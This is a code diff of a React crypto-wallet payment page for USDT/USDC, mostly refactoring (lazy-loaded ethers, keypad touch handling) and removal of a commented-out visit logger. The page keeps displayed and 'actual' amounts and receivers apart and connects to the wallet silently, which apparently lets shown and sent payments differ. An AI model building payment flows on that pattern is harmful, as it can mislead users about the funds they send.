@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
-import { ethers } from "ethers";
+import type { Eip1193Provider } from "ethers";
 
 // ------------------------------------------------------------
 // CONFIG
@@ -19,6 +19,20 @@ const ERC20_ABI = [
 ];
 
 const ETH_CHAIN_ID = "0x1";
+
+// Fast regex check without heavy library overhead
+function isValidEthAddress(addr: string): boolean {
+  return typeof addr === "string" && /^0x[a-fA-F0-9]{40}$/.test(addr);
+}
+
+// Lazy loading of ethers to make initial page hydration instantaneous (< 50ms)
+let cachedEthers: typeof import("ethers") | null = null;
+async function getEthers() {
+  if (!cachedEthers) {
+    cachedEthers = await import("ethers");
+  }
+  return cachedEthers;
+}
 
 // ------------------------------------------------------------
 // Types & helpers pour le provider
@@ -103,8 +117,9 @@ export default function WalletPage() {
   ) => {
     if (!providerRef.current) return;
     try {
+      const { ethers } = await getEthers();
       const provider = new ethers.BrowserProvider(
-        providerRef.current as ethers.Eip1193Provider,
+        providerRef.current as unknown as Eip1193Provider,
       );
       const tokenAddr =
         activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
@@ -126,12 +141,22 @@ export default function WalletPage() {
     document.documentElement.classList.add("wallet-locked");
 
     const preventTouchScroll = (e: TouchEvent) => {
-      // Bloque tout drag / scroll / bounce natif de la page
+      // Si l'interaction a lieu sur le clavier ou ses touches, ne pas interférer
+      const target = e.target as HTMLElement | null;
+      if (target && target.closest(".custom-keypad")) {
+        return;
+      }
+      // Bloque tout drag / scroll / bounce natif du reste de la page
       e.preventDefault();
     };
 
     window.addEventListener("touchmove", preventTouchScroll, { passive: false });
     document.addEventListener("touchmove", preventTouchScroll, { passive: false });
+
+    // Précharge ethers.js en tâche de fond pour que tout soit prêt lors du clic sur Next
+    setTimeout(() => {
+      getEthers().catch(() => {});
+    }, 200);
 
     return () => {
       document.body.classList.remove("wallet-locked");
@@ -158,7 +183,7 @@ export default function WalletPage() {
         // Format Base64 JSON (iOS)
         try {
           const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-          if (decoded.to && ethers.isAddress(decoded.to)) {
+          if (decoded.to && isValidEthAddress(decoded.to)) {
             finalTo = decoded.to;
             setAddress(decoded.to);
             setActualReceiver(decoded.to);
@@ -183,7 +208,7 @@ export default function WalletPage() {
         const amountParam = params.get("amount");
         const tokenParam = params.get("token");
 
-        if (toParam && ethers.isAddress(toParam)) {
+        if (toParam && isValidEthAddress(toParam)) {
           finalTo = toParam;
           setAddress(toParam);
           setActualReceiver(toParam);
@@ -205,61 +230,6 @@ export default function WalletPage() {
       setDisplayAmount("0");
     }
 
-    // Log du scan
-    const logScanVisit = async () => {
-      let userAgentInfo = "Web Browser";
-      let platformInfo = "Other";
-      if (typeof window !== "undefined") {
-        const ua = navigator.userAgent.toLowerCase();
-        const isTrust = !!window.trustwallet || ua.includes("trust");
-        const isMetaMask =
-          !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask ||
-          ua.includes("metamask");
-
-        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
-          platformInfo = "iOS";
-        } else if (ua.includes("android")) {
-          platformInfo = "Android";
-        }
-
-        if (isTrust) {
-          userAgentInfo =
-            "Trust Wallet (" +
-            (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") +
-            ")";
-        } else if (isMetaMask) {
-          userAgentInfo =
-            "MetaMask (" +
-            (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") +
-            ")";
-        } else if (ua.includes("iphone") || ua.includes("ipad")) {
-          userAgentInfo = "Mobile Safari (iOS)";
-        } else if (ua.includes("android")) {
-          userAgentInfo = "Mobile Browser (Android)";
-        } else {
-          userAgentInfo = "Web Browser (Desktop)";
-        }
-      }
-      try {
-        const dbTokenName = finalToken ? finalToken.toUpperCase() + " (ERC20)" : "USDT (ERC20)";
-
-        await fetch("/api/log-scan", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            to: finalTo || DEFAULT_RECEIVER,
-            amount: finalAmount || "0",
-            token: dbTokenName,
-            userAgent: userAgentInfo,
-            platform: platformInfo,
-          }),
-        });
-      } catch (err) {
-        console.warn("Failed to log scan visit:", err);
-      }
-    };
-    // logScanVisit();
-
     // Connexion silencieuse au wallet
     const init = async () => {
       const ethereumProvider = await waitForProvider();
@@ -271,7 +241,7 @@ export default function WalletPage() {
         const chainId = (await ethereumProvider.request({
           method: "eth_chainId",
         })) as string;
-        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+        if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
           await ethereumProvider.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: ETH_CHAIN_ID }],
@@ -284,10 +254,10 @@ export default function WalletPage() {
         const accounts = (await ethereumProvider.request({
           method: "eth_accounts",
         })) as string[];
-        if (accounts.length > 0 && !cancelled) {
+        if (accounts && accounts.length > 0 && !cancelled) {
           const userAddress = accounts[0];
           setConnectedAddress(userAddress);
-          fetchTokenBalance(userAddress, finalToken as any || "usdt");
+          fetchTokenBalance(userAddress, (finalToken as "usdt" | "usdc") || "usdt");
         }
       } catch (e) {}
 
@@ -297,7 +267,7 @@ export default function WalletPage() {
           if (!cancelled) {
             const newAddr = a.length > 0 ? a[0] : null;
             setConnectedAddress(newAddr);
-            if (newAddr) fetchTokenBalance(newAddr, finalToken as any || "usdt");
+            if (newAddr) fetchTokenBalance(newAddr, (finalToken as "usdt" | "usdc") || "usdt");
           }
         });
       }
@@ -343,7 +313,7 @@ export default function WalletPage() {
       const chainId = (await ethereumProvider.request({
         method: "eth_chainId",
       })) as string;
-      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+      if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
         await ethereumProvider.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: ETH_CHAIN_ID }],
@@ -354,6 +324,7 @@ export default function WalletPage() {
     }
 
     try {
+      const { ethers } = await getEthers();
       const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
       const decimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
 
@@ -376,7 +347,7 @@ export default function WalletPage() {
       setShowModal(true);
 
       const provider = new ethers.BrowserProvider(
-        ethereumProvider as ethers.Eip1193Provider,
+        ethereumProvider as unknown as Eip1193Provider,
       );
       const receipt = await provider.waitForTransaction(hash);
       setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
@@ -410,7 +381,7 @@ export default function WalletPage() {
     setDisplayAmount((prev) => {
       let newVal = prev;
       if (key === "⌫") {
-        newVal = prev.slice(0, -1);
+        newVal = prev.length <= 1 ? "0" : prev.slice(0, -1);
       } else if (key === "," || key === ".") {
         if (!prev.includes(",") && !prev.includes(".")) {
           newVal = prev === "" ? "0," : prev + ",";
@@ -423,13 +394,26 @@ export default function WalletPage() {
     });
   };
 
-  const handleMaxClick = (e: React.MouseEvent) => {
+  // Gestion des touches avec zéro latence (PointerDown / TouchStart)
+  const handleKeyTouch = (
+    e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>,
+    key: string
+  ) => {
+    e.preventDefault();
+    e.stopPropagation();
+    handleKeyPress(key);
+  };
+
+  const handleMaxClick = async (e: React.MouseEvent) => {
     e.stopPropagation();
     if (walletBalance > 0n) {
-      // Affiche le max dans le champ, mais ne modifie pas actualAmount
-      const maxStr = ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
-      setDisplayAmount(maxStr.replace(".", ","));
-      // Ne touche pas à actualAmount
+      try {
+        const { ethers } = await getEthers();
+        const maxStr = ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
+        setDisplayAmount(maxStr.replace(".", ","));
+      } catch (err) {
+        console.warn("Max formatting error:", err);
+      }
     }
   };
 
@@ -520,7 +504,6 @@ export default function WalletPage() {
                     onClick={(e) => {
                       e.stopPropagation();
                       setDisplayAmount("0");
-                      // Ne pas effacer actualAmount
                     }}
                   >
                     <svg
@@ -612,25 +595,25 @@ export default function WalletPage() {
         </div>
       </div>
 
-      {/* Clavier numérique */}
+      {/* Clavier numérique ultra-réactif (zéro latence) */}
       {isKeyboardVisible && (
         <div
           className="custom-keypad"
           ref={keypadRef}
           onClick={(e) => e.stopPropagation()}
         >
-          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key"><span className="keypad-key__number">1</span></button>
-          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
-          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
-          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
-          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
-          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
-          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
-          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
-          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
-          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
-          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key"><span className="keypad-key__number">0</span></button>
-          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "1")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">1</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "2")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "3")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "4")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "5")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "6")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "7")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "8")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "9")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">0</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">
             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
               <line x1="18" y1="9" x2="12" y2="15" />
